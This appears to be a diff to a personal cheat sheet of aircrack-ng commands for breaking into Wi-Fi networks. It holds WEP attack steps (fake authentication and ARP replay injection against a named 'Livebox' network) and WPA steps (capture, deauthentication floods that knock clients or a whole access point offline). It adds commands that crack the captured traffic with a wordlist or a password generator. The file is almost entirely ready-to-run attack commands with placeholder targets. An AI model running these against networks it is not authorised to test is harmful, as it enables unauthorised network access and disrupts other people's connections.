@@ -7,6 +7,8 @@ aireplay-ng -1 0 -e Livebox-a1b2 -a BSSID -b BSSID -h STATION interface
 
 aireplay-ng -3 -e ESSID -a BSSID -b BSSID -h STATION -x 600 -r out-01.cap interface
 
+aircrack-ng out-01.cap
+
 
 
 ##### WPA #####
@@ -17,5 +19,9 @@ airodump-ng -w out --encrypt wpa -c 11 --bssid BSSID interface
 aireplay-ng -0 0 -a bssid -c station interface
 aireplay-ng -0 0 -a bssid interface
 
-../wpa_rand | aircrack-ng -w - out-01.cap -e ESSID
+// With file
+	aircrack-ng -w <FILE_DICO> out-01.cap
+
+// With generator
+	../wpa_rand | aircrack-ng -w - out-01.cap -e ESSID
 
